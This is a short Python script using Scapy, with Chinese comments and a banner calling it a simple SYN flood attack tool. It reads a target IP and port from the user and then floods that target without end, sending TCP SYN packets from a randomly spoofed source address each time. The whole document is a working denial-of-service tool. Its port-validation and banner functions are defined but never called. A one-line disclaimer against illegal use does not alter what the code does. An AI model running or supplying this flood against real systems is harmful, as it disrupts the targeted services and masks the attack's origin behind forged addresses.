import sys
import random
from scapy.all import send, IP, TCP
import re

ASD_DK = int(input("请输入端口号（1-65535）："))
def print_banner():
    print("=== 简易SYN洪水攻击工具 ===")
    print("=== 严禁非法操作 ===\n")

# 校验端口号合法性
def is_valid_port(ASD_DK):
    if ASD_DK < 1 or ASD_DK > 65535:
       print("端口号不合法，请输入1-65535之间的数字")
       sys.exit(0)

# 定义一个简单的IP地址校验函数
def is_valid_ip(ip):
    pattern = r'^((25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)$'
    return re.match(pattern, ip) is not None

# 让用户手动输入目标 IP
target_ip = input("请输入目标 IP：")
if not is_valid_ip(target_ip):
    print("输入的IP地址不合法，请重新输入正确的IP地址")
    sys.exit(0)

while True:
    # 随机生成源 IP
    psrc = "%i.%i.%i.%i" % (
        random.randint(1, 254),
        random.randint(1, 254),
        random.randint(1, 254),
        random.randint(1, 254)
    )
    # 构造并发送 SYN 包
    send(IP(src=psrc, dst=target_ip)/TCP(dport=ASD_DK, flags="S"))